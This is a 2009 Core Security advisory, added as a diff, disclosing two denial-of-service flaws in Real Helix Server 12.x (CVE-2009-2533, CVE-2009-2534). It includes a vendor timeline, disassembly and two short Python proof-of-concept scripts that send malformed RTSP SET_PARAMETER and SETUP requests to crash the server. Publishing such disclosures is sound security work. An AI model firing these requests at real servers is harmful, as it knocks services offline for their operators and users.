@@ -1,0 +1,323 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+      Core Security Technologies - CoreLabs Advisory
+           http://www.coresecurity.com/corelabs/
+
+Real Helix DNA RTSP and SETUP request handler vulnerabilities
+
+
+1. *Advisory Information*
+
+Title: Real Helix DNA RTSP and SETUP request handler vulnerabilities
+Advisory ID: CORE-2009-0227
+Advisory URL: http://www.coresecurity.com/content/real-helix-dna
+Date published: 2009-07-17
+Date of last update: 2009-07-17
+Vendors contacted: RealNetworks
+Release mode: Forced release
+
+
+2. *Vulnerability Information*
+
+Class: Denial of service (DoS)
+Remotely Exploitable: Yes
+Locally Exploitable: No
+Bugtraq ID: N/A
+CVE Name: CVE-2009-2533, CVE-2009-2534
+
+
+3. *Vulnerability Description*
+
+Helix Server is a multi-format cross-platform streaming server. Two
+vulnerabilities have been found, that could allow a remote attacker to
+crash the Helix Server.
+
+During a 'RTSP' (SET_PARAMETERS) request handling, if an empty
+'DataConvertBuffer' parameter is received by the server, it will raise
+an exception reading an invalid direction of memory. This exception is
+usually handled correctly but if you send this malformed request
+multiple times in a short period of time, it could render the Helix
+Server unresponsive and terminate its execution.
+
+During the 'SETUP' request handling, a 0x2F character is searched in the
+request line, if this byte is absent the process crashes with an access
+violation.
+
+
+4. *Vulnerable packages*
+
+   . Helix Server Version 12.x
+   . Helix Mobile Server Version 12.x
+   . The vulnerabilities were investigated on Helix Server Version
+12.0.1.215 (Tahiti) Build 175002/12667
+
+
+5. *Non-vulnerable packages*
+
+   . Helix Server Version 13.0.0
+   . Helix Mobile Server Version 13.0.0
+
+
+6. *Vendor Information, Solutions and Workarounds*
+
+According to the Security Update 071409HS [2] published by RealNetworks:
+"The vulnerability is resolved on the following platforms by installing
+Version 13.0.0 of the Helix Server and the Helix Mobile Server. This
+only pertains to supported versions of the platforms listed below. The
+updated version will be available on your RealNetworks PAM site after
+12:00 am PST, on July 14, 2009."
+
+   . Red Hat Enterprise Linux 4
+   . Red Hat Enterprise Linux 5
+   . Sun Solaris 10
+   . Windows 2003
+
+
+7. *Credits*
+
+These vulnerabilities were discovered and researched by Damian Frizza
+from Core Security Technologies.
+
+
+8. *Technical Description / Proof of Concept Code*
+
+
+8.1. *RTSP request handling Denial of Service (CVE-2009-2533)*
+
+The problem arises when the 'rmserver' process receives an 'RTSP
+(SET_PARAMETER)' request with no content in the 'DataConvertBuffer'
+parameter. The handling code reads at the memory location zero (0) and
+triggers an exception, which is handled correctly. However sending this
+malformed request multiple times renders the rmserver process
+unresponsive and subsequently stops its execution.
+
+The code section which triggers the exception is:
+
+/-----------
+
+00458066  |.     C745 08 00000000 MOV DWORD PTR SS:[EBP+8],0
+*Sets the content of the local variable to 0
+0045806D  |.     8B10             MOV EDX,DWORD PTR DS:[EAX]
+0045806F  |.     50               PUSH EAX
+00458070  |.     FF52 2C          CALL DWORD PTR DS:[EDX+2C]
+00458073  |.     8B45 08          MOV EAX,DWORD PTR SS:[EBP+8]
+00458076  |.     8B10             MOV EDX,DWORD PTR DS:[EAX]          *
+Tries to read form 0 memory location
+
+- -----------/
+
+ The following PoC code reproduces the issue:
+
+/-----------
+
+import socket
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('172.16.132.133',554))
+
+setRequest = "SET_PARAMETER / RTSP/1.0\r\n"
+setRequest +="DataConvertBuffer: \r\n\r\n"
+
+for i in range(5):
+  print i
+  s.send(setRequest)
+
+s.close()
+
+- -----------/
+
+
+
+The following output is written in the log file:
+
+/-----------
+
+4068: FATAL ERROR:  The server has run out of memory!
+FATAL ERROR:  Last request was rounded up to 1155072 bytes
+Trace:
+0x00409C96
+...
+...
+...
+0x00000000
+FATAL ERROR:  Server Terminated
+
+- -----------/
+
+
+8.2. *Malformed SETUP command handling Denial of Service (CVE-2009-2534)*
+
+The problem arises when the 'SETUP' request is handled and the byte 0x2F
+is absent in the request line. While handling this kind of malformed
+request the server crashes with an access violation.
+
+The code section which triggers the access violation is:
+
+/-----------
+
+0047A490  |.     6A 2F            PUSH 2F
+0047A492  |.     56               PUSH ESI
+0047A493  |.     FF15 08425100    CALL DWORD PTR DS:[<&MSVCR71.strchr>]
+   ; MSVCR71.strchr
+
+- -----------/
+
+ if only the "/" (0x2F) character is sent, the program tries to copy
+from 0 and the access violation exception is raised.
+
+/-----------
+
+0047A490  |.     6A 2F            PUSH 2F
+0047A492  |.     56               PUSH ESI
+0047A493  |.     FF15 08425100    CALL DWORD PTR DS:[<&MSVCR71.strchr>]
+   ; MSVCR71.strchr
+
+- -----------/
+
+ The following code reproduces the issue:
+
+/-----------
+
+import socket
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('172.16.132.133',554))
+
+setRequest = "SETUP / RTSP/1.0\r\n\r\n"
+
+s.send(setRequest)
+s.close()
+
+- -----------/
+
+
+9. *Report Timeline*
+
+. 2009-03-04:
+Core Security Technologies notifies RealNetworks of the vulnerability.
+Core initially schedules publication of its advisory to April 6th, 2009.
+
+. 2009-03-16:
+Core notifies again RealNetworks of the vulnerability.
+
+. 2009-03-16:
+RealNetworks identifies the vulnerability alert as SPAM.
+
+. 2009-03-20:
+The RealNetworks team asks Core for a technical description of the
+vulnerability.
+
+. 2009-03-23:
+Technical details sent to RealNetworks team by Core. RealNetworks
+acknowledges reception.
+
+. 2009-03-30:
+Core requests information about the plans of RealNetworks to fix the
+vulnerabilities.
+
+. 2009-03-30:
+RealNetworks responds that fixes will be included in the next public
+release - currently targeted for July 2009.
+
+. 2009-05-04:
+Core requests RealNetworks a technical analysis of the vulnerabilities,
+a list of the affected versions of Helix Server, and a detailed timeline
+for developing, testing and releasing fixes for these vulnerabilities.
+It is only based on that information that Core can reevaluate its
+advisory publication timeframe (which was originally scheduled to be
+published on April 6).
+
+. 2009-05-05:
+RealNetworks responds that fixes will be available in mid-2009, most
+likely in the July time frame, and that to protect its customer base
+RealNetworks will not provide additional details until the release is
+publicly available.
+
+. 2009-05-05:
+Core requests a more precise estimation for the release of fixes (no
+reply received).
+
+. 2009-05-29:
+Core requests again RealNetworks an estimated date for the release of
+fixes, and technical details about the issues. In the meantime, the
+publication of advisory CORE-2009-0227 is rescheduled for July 15th (no
+reply received).
+
+. 2009-07-16:
+An updated version of the advisory was sent to RealNetworks by Core.
+Core requests again information about this issue.
+
+. 2009-07-17:
+Core is made aware that Real Networks has released the Security Update
+071409HS [2] on July 14th, which states that version 13.0.0 of the Helix
+Server and the Helix Mobile Server have been updated to ensure that the
+above vulnerabilities have been resolved.
+
+. 2009-07-17:
+The advisory CORE-2009-0227 is published by Core.
+
+
+
+10. *References*
+
+[1] RealNetworks
+http://www.realnetworks.com/
+[2] RealNetworks Security Update 071409HS
+http://docs.real.com/docs/security/SecurityUpdate071409HS.pdf
+
+
+11. *About CoreLabs*
+
+CoreLabs, the research center of Core Security Technologies, is charged
+with anticipating the future needs and requirements for information
+security technologies. We conduct our research in several important
+areas of computer security including system vulnerabilities, cyber
+attack planning and simulation, source code auditing, and cryptography.
+Our results include problem formalization, identification of
+vulnerabilities, novel solutions and prototypes for new technologies.
+CoreLabs regularly publishes security advisories, technical papers,
+project information and shared software tools for public use at:
+http://www.coresecurity.com/corelabs.
+
+
+12. *About Core Security Technologies*
+
+Core Security Technologies develops strategic solutions that help
+security-conscious organizations worldwide develop and maintain a
+proactive process for securing their networks. The company's flagship
+product, CORE IMPACT, is the most comprehensive product for performing
+enterprise security assurance testing. CORE IMPACT evaluates network,
+endpoint and end-user vulnerabilities and identifies what resources are
+exposed. It enables organizations to determine if current security
+investments are detecting and preventing attacks. Core Security
+Technologies augments its leading technology solution with world-class
+security consulting services, including penetration testing and software
+security auditing. Based in Boston, MA and Buenos Aires, Argentina, Core
+Security Technologies can be reached at 617-399-6980 or on the Web at
+http://www.coresecurity.com.
+
+
+13. *Disclaimer*
+
+The contents of this advisory are copyright (c) 2009 Core Security
+Technologies and (c) 2009 CoreLabs, and may be distributed freely
+provided that no fee is charged for this distribution and proper credit
+is given.
+
+
+14. *PGP/GPG Keys*
+
+This advisory has been signed with the GPG key of Core Security
+Technologies advisories team, which is available for download at
+http://www.coresecurity.com/files/attachments/core_security_advisories.asc.
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.8 (MingW32)
+Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
+
+iEYEARECAAYFAkpg7eMACgkQyNibggitWa38bgCeNFBQ02cGJvhhtc8eYMaEa9VH
+UHMAn3Ngc4GBXkyfSe+hkgJWYtQ13Vjh
+=9iPO
+-----END PGP SIGNATURE-----
+
+# milw0rm.com [2009-07-17]
